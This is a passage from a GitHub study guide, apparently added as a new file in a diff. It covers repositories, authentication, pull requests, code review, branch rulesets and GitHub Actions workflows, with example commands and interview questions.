@@ -1,0 +1,772 @@
+@ Beginner
+
+# 00 | GitHub Basics: Start Here | Git vs GitHub, history, what the platform offers, account and first repository, pushing existing code, core vocabulary, GitHub vs GitLab, Bitbucket and Azure DevOps | Start Here
+
+## Git vs GitHub | rose
+- **Git** is the **distributed version control system** (created by Linus Torvalds in 2005): it runs locally and tracks history in a `.git` directory (see the Git topic).
+- **GitHub** is a **hosting and collaboration platform** built around Git repositories: remote repositories plus **pull requests, code review, issues, Actions CI/CD, security scanning, packages, Pages** and access control.
+- You can use Git without GitHub (other hosts, or none); GitHub adds the workflow around the code. Alternatives built on the same idea: GitLab, Bitbucket, Azure DevOps Repos, Gitea.
+
+## History | blue
+- GitHub launched in **April 2008**, founded by **Tom Preston-Werner, Chris Wanstrath, PJ Hyett** and **Scott Chacon**. Its free hosting for open-source projects and the **pull request** model made it the default home of open source.
+- **Microsoft** acquired GitHub in **2018** (US$7.5 billion in stock); it continues as a platform used by more than 100 million developers (2023).
+- Milestones: **free unlimited private repositories** for individuals (2019); **GitHub Actions** CI/CD generally available (**November 2019**); the default branch name for new repositories became **`main`** (October 2020); **password authentication for Git operations was removed** in favour of tokens and SSH keys (August 2021); **GitHub Copilot** (preview 2021, GA 2022); **mandatory two-factor authentication** for code contributors (rolled out 2023-2024); **repository rulesets** and **merge queue** (2023).
+
+## What the Platform Offers | green
+- **Code**: repositories, branches, tags, releases, web editor (press `.` on a repository for github.dev), Codespaces (cloud development environments).
+- **Collaboration**: pull requests and code review, issues, Projects (planning boards), Discussions, wikis, notifications.
+- **Automation**: **GitHub Actions** (CI/CD and any event-driven workflow), webhooks, the REST and GraphQL APIs, the **`gh` CLI**.
+- **Security**: Dependabot, code scanning (CodeQL), secret scanning with push protection, security advisories.
+- **Distribution**: **GitHub Packages** (container registry `ghcr.io`, Maven, npm), **Releases**, **GitHub Pages** (static sites).
+- **AI**: **GitHub Copilot** (completions, chat, code review, and an agent that works on issues).
+- Plans: **Free**, **Team** and **Enterprise** (Cloud or self-hosted **Enterprise Server**); organisations group repositories and teams.
+
+## Your First Repository | amber
+```bash
+# 1. On github.com: New repository -> name "shop-api", Private, add README, .gitignore (Java), licence
+# 2. Clone it (SSH) and work locally
+git clone git@github.com:ann/shop-api.git
+cd shop-api
+git switch -c feature/health-endpoint
+# ... edit files ...
+git add .
+git commit -m "Add health endpoint"
+git push -u origin feature/health-endpoint        # then open a pull request on github.com
+
+# Or publish an existing local project:
+git remote add origin git@github.com:ann/shop-api.git
+git push -u origin main
+gh repo create shop-api --private --source=. --push   # the same in one step with the GitHub CLI
+```
+- **`origin`** is the conventional name of the remote you cloned from. **`-u`** (`--set-upstream`) links the local branch to the remote one, so later `git push` and `git pull` need no arguments.
+
+## Core Vocabulary | violet
+- **Repository (repo)**: a project's files and full history. **Remote**: a hosted copy (`origin`). **Owner**: the user or organisation account.
+- **Fork**: your own server-side copy of someone else's repository. **Clone**: a local copy.
+- **Pull request (PR)**: a request to merge one branch into another, with discussion, review and checks.
+- **Issue**: a tracked task, bug or idea. **Label**, **milestone**, **assignee**: issue and PR metadata.
+- **Workflow**: an automated GitHub Actions process defined in YAML. **Runner**: the machine that executes it. **Check**: a status result shown on a commit or PR.
+- **Organization**, **team**, **collaborator**: how access is granted. **Visibility**: public, private, or internal (enterprise only).
+
+## GitHub vs GitLab vs Bitbucket vs Azure DevOps | blue
+- **GitHub**: the largest community and open-source ecosystem, Actions marketplace, Copilot; owned by Microsoft.
+- **GitLab**: a single DevOps platform with built-in CI/CD (`.gitlab-ci.yml`), security and planning; strong **self-hosted** option; "merge requests" instead of pull requests.
+- **Bitbucket** (Atlassian): integrates tightly with **Jira** and Confluence; Bitbucket Pipelines for CI.
+- **Azure DevOps**: Microsoft's enterprise suite (Boards, Repos, Pipelines, Artifacts, Test Plans), common in .NET and Azure shops.
+- The Git skills are identical everywhere; the differences are in review workflow, CI syntax, permissions and integrations.
+
+## Interview Q&A | sky | wide
+Q: What is the difference between Git and GitHub?
+A: Git is the version control tool that tracks history locally; GitHub is a hosting platform for Git repositories that adds pull requests, code review, issues, Actions CI/CD, security tooling and access control.
+Q: Who owns GitHub and when was it founded?
+A: It was founded in 2008 by Tom Preston-Werner, Chris Wanstrath, PJ Hyett and Scott Chacon, and acquired by Microsoft in 2018.
+Q: What is a pull request?
+A: A proposal to merge changes from one branch into another, where the team discusses, reviews and runs automated checks before merging.
+Q: Fork vs clone?
+A: A fork is a server-side copy of a repository under your own account (used to contribute without write access); a clone is a local copy of any repository on your machine.
+Q: What does git push -u origin main do?
+A: Pushes the local main branch to the remote named origin and sets it as the upstream, so later push and pull commands default to it.
+Q: GitHub vs GitLab?
+A: Both host Git with review and CI/CD. GitHub has the biggest community, Actions marketplace and Copilot; GitLab offers an all-in-one DevOps platform with built-in CI and a strong self-managed edition.
+
+# 01 | Repositories & Authentication | Visibility, README, LICENSE and .gitignore, HTTPS with personal access tokens, SSH keys, 2FA, signed commits, repository settings | Repos & Auth
+
+## Repositories and Their Files | rose
+- **Visibility**: **public** (anyone can read; required for most free open-source features), **private** (only people granted access), **internal** (everyone in the enterprise; Enterprise plans only).
+- **README.md** is rendered on the repository home page: what the project does, how to run, test and contribute.
+- **LICENSE**: without one, nobody may legally reuse public code; common choices are MIT, Apache-2.0 and GPL-3.0.
+- **`.gitignore`**: build output, dependencies and secrets never belong in Git (`target/`, `node_modules/`, `.env`). GitHub offers templates per language.
+- Community files: `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `SECURITY.md`, issue and PR templates in `.github/`. **Template repositories** let teams start new projects from a standard skeleton.
+
+## HTTPS and Personal Access Tokens | blue
+- GitHub **does not accept account passwords** for Git operations (since August 2021). Over HTTPS you authenticate with a **personal access token (PAT)**, usually stored by **Git Credential Manager** or the `gh` CLI (`gh auth login`, then `gh auth setup-git`).
+- **Fine-grained PATs** (recommended): limited to **chosen repositories** with **specific permissions** (for example Contents: read and write) and a **mandatory expiry**; organisations can require approval.
+- **Classic PATs**: broad **scopes** (`repo`, `workflow`, `admin:org`...) across every repository you can access; avoid them for automation.
+- Treat tokens like passwords: never commit them (secret scanning will flag them), give them the least privilege and the shortest life, and use **GitHub Apps** or `GITHUB_TOKEN` for automation (sheet 08).
+
+## SSH Keys | green
+```bash
+ssh-keygen -t ed25519 -C "ann@example.com"        # creates ~/.ssh/id_ed25519 (private) and id_ed25519.pub (public)
+cat ~/.ssh/id_ed25519.pub                          # paste into GitHub: Settings -> SSH and GPG keys -> New SSH key
+ssh -T git@github.com                              # "Hi ann! You've successfully authenticated, but GitHub does not provide shell access."
+git clone git@github.com:ann/shop-api.git          # SSH URL form
+```
+- **SSH**: a key pair; GitHub stores the **public** key, and the private key never leaves your machine (protect it with a passphrase and `ssh-agent`). **Ed25519** is the modern default key type.
+- HTTPS vs SSH: both are secure. HTTPS works through most corporate proxies and uses tokens; SSH avoids typing credentials and suits developer machines. **Deploy keys** give one server SSH access to one repository.
+
+## Two-Factor Authentication and Signed Commits | amber
+- **2FA** (authenticator app, security key or passkey) is **required** for accounts that contribute code on GitHub.com, and organisations can require it for members.
+- Git trusts whatever name and email you configure, so anyone can create a commit "by" you. **Signed commits** prove authorship: GitHub shows a **Verified** badge when the signature matches a key on your account.
+```bash
+git config --global gpg.format ssh                              # sign with your SSH key (GPG and S/MIME also work)
+git config --global user.signingkey ~/.ssh/id_ed25519.pub
+git config --global commit.gpgsign true                         # sign every commit
+git log -1 --show-signature                                     # Good "git" signature for ann@example.com with ED25519 key SHA256:...
+```
+- Add the same public key to GitHub as a **signing key** (it is separate from an authentication key). Branch rules can **require signed commits**, and **vigilant mode** marks your unsigned commits as Unverified.
+
+## Repository Settings Worth Knowing | violet
+- **Collaborators and teams** with roles: **Read**, **Triage**, **Write**, **Maintain**, **Admin**.
+- **Default branch** (`main`), allowed **merge methods** (merge, squash, rebase), **auto-delete head branches** after merge, **auto-merge**.
+- **Branch protection and rulesets** (sheet 04), **secrets and variables** for Actions (sheet 05), **webhooks** and **deploy keys** (sheet 08), **security** features (sheet 07).
+- **Archive** a repository to make it read-only; **transfer** it to another owner (redirects are kept).
+
+## Interview Q&A | sky | wide
+Q: How do you authenticate Git operations with GitHub?
+A: Over HTTPS with a personal access token (preferably fine-grained, managed by Git Credential Manager or gh), or over SSH with a key pair whose public key is added to the account. Account passwords are not accepted.
+Q: Fine-grained vs classic personal access tokens?
+A: Fine-grained tokens are limited to selected repositories, carry specific permissions and must expire. Classic tokens use broad scopes across all accessible repositories. Prefer fine-grained tokens or GitHub Apps.
+Q: Why sign commits?
+A: Git lets anyone set any author name and email. A signature made with your GPG or SSH key proves the commit came from you, and GitHub marks it Verified; rules can require it.
+Q: What belongs in .gitignore?
+A: Build output, dependency folders, IDE files, logs and secrets such as .env files: anything generated or sensitive that should not be versioned.
+Q: What repository roles exist?
+A: Read, Triage (manage issues and PRs), Write (push), Maintain (manage the repository without destructive settings) and Admin (full control).
+Q: SSH or HTTPS?
+A: Both are secure. SSH uses keys and avoids credential prompts; HTTPS uses tokens and passes more easily through corporate firewalls and proxies.
+
+# 02 | Forks, Branches & Pull Requests | Branch-based work, the fork workflow and syncing upstream, the pull request lifecycle, draft PRs, linking issues, merge methods compared, conflicts | Pull Requests
+
+## Branches and Forks | rose
+- **Inside one repository** (teams): create a **branch** per change (`feature/add-cart`), push it, open a PR into `main`.
+- **Fork workflow** (open source, or no write access): **fork** the repository, clone **your fork** (`origin`), add the original as **`upstream`**, push branches to your fork, and open a PR **from your fork to upstream**.
+```bash
+gh repo fork acme/shop-api --clone                    # fork + clone + add the original as "upstream"
+git remote -v                                          # origin = your fork, upstream = acme/shop-api
+git switch -c feature/add-cart
+git push -u origin feature/add-cart                    # push to YOUR fork, then open the PR to upstream
+
+# keep your fork's main in sync with upstream
+git fetch upstream
+git switch main
+git merge --ff-only upstream/main
+git push origin main                                  # (or the "Sync fork" button on GitHub)
+```
+
+## The Pull Request Lifecycle | blue
+- **1. Open** a PR from the head branch to the base branch with a clear title and description: what changed, why, how it was tested, screenshots for UI changes.
+- **2. Draft PR** (`gh pr create --draft`) for early feedback; it cannot be merged until marked **ready for review**.
+- **3. Checks** run (Actions CI, CodeQL, linters) and show as statuses on the PR; **reviewers** comment, approve or request changes (sheet 03).
+- **4. Iterate**: push more commits to the same branch; the PR updates automatically. Bring in base-branch changes with **Update branch** or a local merge or rebase.
+- **5. Merge** when checks pass and reviews are approved (rules can enforce both), then **delete the branch**.
+- **Link issues** with keywords in the description: **`Closes #42`**, `Fixes #42` or `Resolves #42` close the issue when the PR merges into the default branch.
+```bash
+gh pr create --base main --title "Add cart endpoint" --body "Closes #42" --reviewer bo --draft
+gh pr checkout 57                                     # check out someone's PR locally to test it
+gh pr merge 57 --squash --delete-branch               # or --merge / --rebase; --auto waits for checks and reviews
+```
+
+## Merge Methods Compared | green
+```text
+feature branch: 3 commits ("Add cart step 1..3"); main gained "Add license" meanwhile    (verified with local repos)
+
+Create a merge commit   *   Merge pull request #1 from ann/feature/add-cart
+                        |\    keeps all 3 commits + a merge commit (6 commits, 1 merge)
+                        | * Add cart step 3 ...
+Squash and merge        * Add cart (#1)          one new commit with all the changes (3 commits total)
+Rebase and merge        * Add cart step 3        the 3 commits replayed on top of main with NEW SHAs
+                        * Add cart step 2          (b5750f4 became 61d6419); linear, no merge commit
+```
+- **Merge commit**: preserves the branch's full history and shows where it was merged; history becomes non-linear.
+- **Squash and merge**: one tidy commit per PR on `main` (easy to revert or cherry-pick); the individual commits are lost from `main`.
+- **Rebase and merge**: linear history that keeps each commit, but they get new SHAs, so the branch's commits no longer match `main`'s.
+- Teams usually allow one or two methods in repository settings; **squash** is a common default for feature branches.
+
+## Conflicts and Keeping a PR Current | amber
+- GitHub reports **"This branch has conflicts that must be resolved"** when the same lines changed on both sides. Simple conflicts can be resolved in the web editor; otherwise resolve locally: `git fetch origin`, `git merge origin/main` (or `git rebase origin/main`), fix the files, commit, and push (`--force-with-lease` after a rebase).
+- **Update branch** merges (or rebases) the base branch into the PR branch from the web UI; rules can **require branches to be up to date** before merging, and a **merge queue** automates this at scale (sheet 04).
+- Keep PRs **small and focused** (a few hundred lines): they are reviewed faster and more thoroughly, and conflict less.
+
+## Interview Q&A | sky | wide
+Q: How do you contribute to an open-source project on GitHub?
+A: Fork the repository, clone your fork, add the original as upstream, create a branch, commit and push to your fork, then open a pull request to the upstream repository and respond to review.
+Q: How do you keep a fork up to date?
+A: Fetch upstream, fast-forward your main to upstream/main and push it to your fork (or use the Sync fork button), then merge or rebase your feature branches onto it.
+Q: Merge commit vs squash vs rebase merge?
+A: A merge commit keeps all commits and adds a merge commit (non-linear history). Squash combines the PR into one new commit. Rebase replays each commit onto the base with new SHAs, giving linear history without a merge commit.
+Q: How do you close an issue automatically from a PR?
+A: Put a keyword such as "Closes #42" in the PR description (or a commit message); the issue closes when the PR merges into the default branch.
+Q: What is a draft pull request?
+A: A PR marked as work in progress: it can receive comments and run checks but cannot be merged until marked ready for review.
+Q: What makes a good pull request?
+A: Small and focused, a clear title and description explaining what and why, linked issue, tests, passing checks, and screenshots or notes for reviewers.
+
+# 03 | Code Review & Collaboration | Reviews, suggested changes, CODEOWNERS, review etiquette, issues and templates, labels and milestones, Projects, GitHub Flavored Markdown | Collaboration
+
+## Reviewing a Pull Request | rose
+- Reviewers comment on lines or ranges in **Files changed**, then submit a review: **Comment** (feedback only), **Approve**, or **Request changes** (blocks merging when reviews are required).
+- **Suggested changes**: a reviewer proposes exact replacement code in a comment block; the author applies it with one click (several can be batched into one commit).
+- **Re-request review** after addressing feedback; **resolve conversations** as they are handled (rules can require all conversations to be resolved).
+- A suggestion is written as a fenced code block whose info string is **`suggestion`** (three backticks followed by `suggestion`, the replacement lines, then three closing backticks) inside a line comment.
+- `gh pr review 57 --approve`, `--request-changes -b "..."`, `--comment -b "..."` do the same from the terminal.
+
+## CODEOWNERS | blue
+```text .github/CODEOWNERS
+# Each line: a path pattern, then the owners. The LAST matching pattern wins.
+*                    @acme/backend-leads
+/web/                @acme/frontend
+*.sql                @acme/dba @ann
+/.github/workflows/  @acme/devops
+/docs/               @bo
+```
+- A **`CODEOWNERS`** file (in `.github/`, the root, or `docs/`) names the people or teams **responsible for paths**. They are **automatically requested** as reviewers when a PR touches their files.
+- With the rule **"Require review from Code Owners"**, the owners' approval becomes **mandatory** for those paths. Owners need write access; the **last matching pattern takes precedence**, as in `.gitignore`-style ordering.
+
+## Review Practice | green
+- **Authors**: small PRs, a description with context and testing notes, self-review the diff first, respond to every comment.
+- **Reviewers**: check correctness, design, tests, security and readability before style (leave formatting to linters); be specific and kind; distinguish blocking issues from **nits**; review promptly.
+- **Automate the boring parts**: CI, formatters, linters, CodeQL and Copilot code review run before humans spend time.
+
+## Issues, Labels, Milestones and Projects | amber
+- **Issues** track bugs, features and tasks: title, description, **assignees**, **labels** (`bug`, `good first issue`), **milestones** (a release or sprint with a due date and progress bar), linked PRs, and **sub-issues** for breaking work down.
+- **Issue forms and templates** in `.github/ISSUE_TEMPLATE/` (YAML forms with required fields) collect consistent bug reports.
+- **GitHub Projects**: planning boards and tables over issues and PRs, with custom fields (status, priority, iteration), views (board, table, roadmap) and automation.
+- **Discussions** for Q&A and ideas that are not actionable tasks yet.
+
+## GitHub Flavored Markdown | violet
+```markdown
+## Summary
+Adds the cart endpoint. Closes #42, related to acme/web#7.
+
+- [x] Unit tests
+- [ ] Update API docs
+
+@acme/frontend please check the response shape. See commit a1b2c3d.
+
+| Endpoint      | Method |
+|---------------|--------|
+| /api/cart     | POST   |
+
+> [!WARNING]
+> Requires the V12 database migration.
+```
+- **GFM** adds **task lists** (`- [ ]`), **tables**, **@mentions** (people and teams), **references** (`#42`, `org/repo#7`, commit SHAs autolink), **fenced code** with syntax highlighting, **alerts** (`> [!NOTE]`, `[!WARNING]`), Mermaid diagrams and emoji.
+
+## Interview Q&A | sky | wide
+Q: What review states can a reviewer submit?
+A: Comment (feedback without a decision), Approve, or Request changes, which blocks merging when approvals are required until the reviewer approves or the review is dismissed.
+Q: What is CODEOWNERS?
+A: A file mapping path patterns to responsible users or teams. They are automatically requested for review on PRs touching those paths, and with branch rules their approval can be required. The last matching pattern wins.
+Q: What are suggested changes?
+A: Review comments containing replacement code that the PR author can apply as a commit with one click.
+Q: How do you organise work on GitHub?
+A: Issues with labels, assignees, milestones and sub-issues, issue forms for consistent reports, and Projects boards or tables with custom fields and automation.
+Q: What do you look for when reviewing code?
+A: Correctness and edge cases, design and maintainability, tests, security (input validation, secrets, permissions), performance where relevant, and readability, leaving pure formatting to tools.
+
+@ Intermediate
+
+# 04 | Branch Protection, Rulesets & Merge Queue | Protecting main, required reviews and status checks, linear history and signed commits, rulesets vs classic protection, bypass, push rules, merge queue, auto-merge | Rulesets
+
+## Why Protect Branches | rose
+- Without protection, anyone with write access can **push directly to `main`**, **force-push** over history, or **delete** the branch. Protection makes the PR workflow mandatory and keeps `main` releasable.
+- Typical rules for `main`:
+- **Require a pull request** before merging, with **N approving reviews**; **dismiss stale approvals** when new commits are pushed; **require review from Code Owners**; **require approval of the most recent push** (someone other than the last pusher).
+- **Require status checks to pass** (choose the CI jobs, such as `build (21)` or `CodeQL`), optionally **require the branch to be up to date** with `main`.
+- **Require conversation resolution**, **require signed commits**, **require linear history** (only squash or rebase merges).
+- **Block force pushes** and **block deletions**; **restrict who can push**.
+
+## Rulesets vs Classic Branch Protection | blue
+- **Classic branch protection rules**: one rule per branch pattern, configured per repository.
+- **Repository rulesets** (2023, recommended): named sets of rules targeting **branches or tags** by pattern, with an **enforcement status** (active, disabled, or evaluate on Enterprise to dry-run), a **bypass list** (roles, teams, apps allowed to bypass), and **layering**: several rulesets can apply to the same branch, and the most restrictive combination wins.
+- Rulesets can also be defined at the **organisation** level for many repositories, and **anyone with read access can see them**, so contributors know the rules.
+- Extra rule types: **commit metadata** (commit message or author email patterns), **push rulesets** (block file paths, extensions or sizes anywhere in the repository), **required workflows**, and **required deployments** to an environment before merging.
+
+## Merge Queue and Auto-Merge | green
+- With "require branches to be up to date", busy repositories suffer a race: every merge makes the other PRs stale, so authors keep updating and re-running CI.
+- A **merge queue** solves this: approved PRs are added to a queue; GitHub creates temporary branches containing **main + the PRs ahead + this PR**, runs the required checks on that combination, and merges in order. A failing PR is removed without blocking the others.
+- Workflows must also run on the queue's event to report checks: `on: merge_group`.
+- **Auto-merge** (`gh pr merge --auto --squash`) merges a PR automatically once all requirements (reviews, checks) are met: great with Dependabot and small fixes.
+
+## Tags and Environments | amber
+- **Tag rulesets** protect release tags (`v*`) from being moved or deleted.
+- **Environments** (`production`, `staging`) add their own protection for deployments: **required reviewers**, a **wait timer**, **deployment branch and tag rules** (only `main` may deploy to production), and environment-scoped **secrets** (sheet 06).
+
+## Interview Q&A | sky | wide
+Q: How do you prevent direct pushes to main?
+A: With a branch protection rule or ruleset on main requiring pull requests, approvals and passing status checks, and blocking force pushes and deletions, with a minimal bypass list.
+Q: Rulesets vs branch protection rules?
+A: Rulesets are newer: they can target branches and tags, be layered, defined at organisation level, have bypass lists and evaluate mode, and include extra rules such as commit metadata and push restrictions. Classic rules are one per branch pattern in one repository.
+Q: What problem does a merge queue solve?
+A: In busy repositories each merge makes other PRs out of date; the queue tests each PR combined with main and the PRs ahead of it and merges them in order, keeping main green without manual rebasing.
+Q: What are required status checks?
+A: CI jobs (or other checks) that must succeed on a PR's latest commit before it can be merged.
+Q: What does "dismiss stale approvals" do?
+A: It invalidates existing approvals when new commits are pushed, so reviewers must approve the final code.
+
+# 05 | GitHub Actions Fundamentals | Workflows, events, jobs, steps, runners, actions, contexts and expressions, secrets and variables, matrix builds, caching, artifacts, concurrency, limits | Actions
+
+## Core Concepts | rose
+- **GitHub Actions** is GitHub's CI/CD and automation platform. **Workflows** are YAML files in **`.github/workflows/`**, triggered by **events** (push, pull request, schedule, manual, release, issue comment...).
+- A workflow has **jobs**; each job runs on a fresh **runner** (virtual machine or container) and contains **steps**: shell commands (`run:`) or reusable **actions** (`uses: owner/repo@version`).
+- **Jobs run in parallel** by default; **`needs:`** creates dependencies. Steps in a job run **sequentially** and share the job's filesystem.
+- **GitHub-hosted runners** (current labels): `ubuntu-latest` (Ubuntu 24.04; 26.04 is also offered), `windows-latest` (Windows Server 2025), `macos-latest` (macOS 26 on Apple silicon), Arm Linux (`ubuntu-24.04-arm`) and a lightweight `ubuntu-slim`. **Self-hosted runners** run on your own machines (sheet 06).
+
+## A CI Workflow for a Spring Boot Project | blue
+```yaml .github/workflows/ci.yml
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:                       # "Run workflow" button and gh workflow run
+
+permissions:
+  contents: read                           # least privilege for GITHUB_TOKEN
+
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true                 # a new push cancels the older run of the same branch
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        java: [17, 21]                     # two jobs: build (17) and build (21)
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-java@v6
+        with:
+          distribution: temurin
+          java-version: ${{ matrix.java }}
+          cache: maven                     # caches ~/.m2/repository keyed on pom.xml files
+      - name: Build and test
+        run: ./mvnw -B verify
+      - name: Upload test reports
+        if: failure()
+        uses: actions/upload-artifact@v7
+        with:
+          name: surefire-reports-java${{ matrix.java }}
+          path: target/surefire-reports/
+          retention-days: 7
+```
+- All workflow examples in this topic pass **actionlint 1.7.12** and use the **current major versions** of the official actions (checkout v7, setup-java v6, setup-node v7, cache v6, upload-artifact v7, download-artifact v8), which run on the node24 runtime.
+
+## Events, Contexts and Expressions | green
+- Common **events**: `push` and `pull_request` (with `branches`, `paths` filters), `workflow_dispatch` (manual, with `inputs`), `schedule` (`cron`, in **UTC**, minimum every 5 minutes, runs on the default branch), `release`, `issues`, `issue_comment`, `workflow_call` (reusable), `merge_group`, `workflow_run`.
+- **Contexts** hold data: `github` (event, ref, sha, actor, repository), `env`, `vars`, `secrets`, `matrix`, `steps`, `needs`, `runner`, `inputs`.
+- **Expressions** `${{ ... }}` evaluate contexts and functions: `if: github.ref == 'refs/heads/main'`, `success()`, `failure()`, `always()`, `cancelled()`, `contains()`, `startsWith()`, `hashFiles()`, `toJSON()`.
+- **Step outputs**: write `name=value` to the file in `$GITHUB_OUTPUT` and read it as `steps.<id>.outputs.name`; job outputs pass values to dependent jobs through `needs.<job>.outputs`. `$GITHUB_ENV` sets environment variables for later steps, and `$GITHUB_STEP_SUMMARY` writes Markdown to the run summary.
+
+## Secrets, Variables, Matrix, Cache and Artifacts | amber
+```yaml .github/workflows/web.yml
+on:
+  pull_request:
+    paths: ["web/**"]
+jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        node: [22, 24]
+        exclude:
+          - os: windows-latest
+            node: 22                         # 3 jobs instead of 4
+    defaults:
+      run:
+        working-directory: web
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: ${{ matrix.node }}
+          cache: npm
+          cache-dependency-path: web/package-lock.json
+      - run: npm ci
+      - run: npm test -- --watch=false
+      - uses: actions/cache@v6
+        with:
+          path: web/.angular/cache
+          key: ng-${{ runner.os }}-${{ hashFiles('web/package-lock.json') }}
+          restore-keys: ng-${{ runner.os }}-
+```
+- **Secrets** (`${{ secrets.NAME }}`, set with `gh secret set NAME`) are encrypted and **masked** in logs, at repository, environment or organisation level. **Secrets are not passed to workflows triggered by pull requests from forks.** **Variables** (`${{ vars.NAME }}`) hold non-sensitive configuration.
+- **Matrix** strategies fan one job out over combinations (`include` and `exclude` adjust them; `max-parallel` limits concurrency; `fail-fast` cancels the rest on the first failure).
+- **Caching** (`actions/cache`, or the built-in `cache:` of setup actions) restores dependencies by **key**, falling back to **restore-keys** prefixes. There is **10 GB per repository**, and entries unused for 7 days are evicted.
+- **Artifacts** (`upload-artifact` / `download-artifact`) keep build outputs and reports after the run (90 days by default), and pass files **between jobs**, because each job has a fresh runner.
+
+## Limits and Costs | violet
+- A job on a GitHub-hosted runner may run for at most **6 hours**; a workflow run for at most **35 days** (including waiting for approvals).
+- **Public repositories** use standard GitHub-hosted runners **for free**; private repositories get included minutes per month (**2,000** on Free, **3,000** on Pro and Team, **50,000** on Enterprise Cloud), then pay per minute (Linux is cheapest; Windows and macOS cost more). Self-hosted runner minutes are free.
+- Scheduled workflows in **public** repositories are **disabled after 60 days** without repository activity.
+
+## Interview Q&A | sky | wide
+Q: Explain the structure of a GitHub Actions workflow.
+A: A YAML file in .github/workflows with a name, on (triggering events), optional permissions, env and concurrency, and jobs. Each job has runs-on (the runner), optional needs, strategy and environment, and a list of steps that either run shell commands or use actions.
+Q: How do jobs share data?
+A: Each job runs on a fresh runner, so files are passed with upload-artifact and download-artifact, and small values with job outputs via needs.<job>.outputs.
+Q: Cache vs artifact?
+A: A cache speeds up future runs by restoring dependencies by key and may be evicted; an artifact stores outputs of a run (reports, binaries) for download or for later jobs, with a retention period.
+Q: How do you run tests on several Java versions?
+A: With a matrix strategy (matrix: java: [17, 21]) and ${{ matrix.java }} in setup-java; GitHub creates one job per value.
+Q: How are secrets handled?
+A: Stored encrypted at repository, environment or organisation level, exposed via the secrets context, masked in logs, and not given to workflows triggered by pull requests from forks.
+Q: What does concurrency with cancel-in-progress do?
+A: It groups runs (for example by branch) and cancels an older in-progress run when a newer one starts, saving minutes and avoiding outdated deployments.
+Q: GitHub Actions vs Jenkins?
+A: Actions is hosted, configured in YAML in the repository, event-driven by GitHub activity, with a large marketplace of reusable actions and no server to maintain. Jenkins is self-hosted, extremely flexible through plugins and Groovy pipelines, and works with any Git host, but you operate it yourself (see the CI/CD topic).
+
+@ Advanced
+
+# 06 | Actions for Deployment & Actions Security | Environments and approvals, OIDC to cloud providers, GITHUB_TOKEN permissions, reusable workflows, composite actions, self-hosted runners, script injection, pull_request_target, pinning actions | Deploy & Secure
+
+## Environments and Deployments | rose
+```yaml .github/workflows/deploy.yml
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    outputs:
+      version: ${{ steps.meta.outputs.version }}
+    steps:
+      - uses: actions/checkout@v7
+      - id: meta
+        run: echo "version=$(date +%Y%m%d)-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
+      - run: npm ci && npm run build
+      - uses: actions/upload-artifact@v7
+        with:
+          name: site
+          path: dist/
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    environment:
+      name: production                       # required reviewers, wait timer, branch rules, env secrets
+      url: https://shop.example.com
+    permissions:
+      id-token: write                        # allow requesting an OIDC token
+      contents: read
+    steps:
+      - uses: actions/download-artifact@v8
+        with:
+          name: site
+          path: dist
+      - uses: aws-actions/configure-aws-credentials@v6
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
+          aws-region: ap-south-1
+      - run: aws s3 sync dist "s3://shop-frontend/${{ needs.build.outputs.version }}" --delete
+```
+- A job that references an **environment** waits for its **protection rules** (required reviewers, wait timer, allowed branches) and receives that environment's **secrets and variables**. Deployments appear on the repository's Deployments page.
+
+## OIDC Instead of Long-Lived Cloud Keys | blue
+- Storing cloud access keys as secrets means long-lived credentials that can leak. With **OpenID Connect**, the job requests a **short-lived signed token** from GitHub (`permissions: id-token: write`); the cloud provider (AWS IAM, Azure, Google Cloud) **trusts GitHub's OIDC issuer** and exchanges the token for **temporary credentials**.
+- The cloud-side **trust policy** restricts which repository, branch or environment may assume the role, using claims such as `sub: repo:acme/shop:environment:production`, so a fork or another branch cannot deploy.
+
+## GITHUB_TOKEN and Least Privilege | green
+- Every job gets an automatic **`GITHUB_TOKEN`** scoped to the repository and **expiring when the job ends**. Set its permissions explicitly with **`permissions:`** at workflow or job level (`contents: read`, `packages: write`, `pull-requests: write`, `id-token: write`, `security-events: write`); unspecified permissions become `none`.
+- Organisations should set the default to **read-only**. Events created with `GITHUB_TOKEN` **do not trigger new workflow runs** (preventing loops), except `workflow_dispatch` and `repository_dispatch`.
+- Use a **GitHub App token** when a workflow must trigger other workflows or act across repositories.
+
+## Reusable Workflows and Composite Actions | amber
+```yaml .github/workflows/reusable-test.yml
+on:
+  workflow_call:
+    inputs:
+      java-version:
+        type: string
+        default: "21"
+    secrets:
+      SONAR_TOKEN:
+        required: false
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - uses: ./.github/actions/setup-app          # a local composite action
+        with:
+          java-version: ${{ inputs.java-version }}
+      - run: ./mvnw -B verify
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+```
+```yaml .github/workflows/nightly.yml
+on:
+  schedule:
+    - cron: "30 1 * * *"          # 01:30 UTC every day
+jobs:
+  tests:
+    uses: ./.github/workflows/reusable-test.yml     # or acme/ci/.github/workflows/test.yml@v2
+    with:
+      java-version: "25"
+    secrets: inherit
+```
+```yaml .github/actions/setup-app/action.yml
+name: Setup app
+description: Set up Java with the Maven cache
+inputs:
+  java-version:
+    description: Java version
+    default: "21"
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-java@v6
+      with:
+        distribution: temurin
+        java-version: ${{ inputs.java-version }}
+        cache: maven
+    - run: echo "Java ${{ inputs.java-version }} ready"
+      shell: bash
+```
+- **Reusable workflows** (`on: workflow_call`) share **whole pipelines with jobs** across repositories; callers pass `with:` inputs and `secrets:` (or `secrets: inherit`).
+- **Composite actions** bundle **steps** into one action used inside a job. Custom actions can also be **JavaScript** (`using: node24`) or **Docker** container actions; publish them to the **Marketplace**.
+
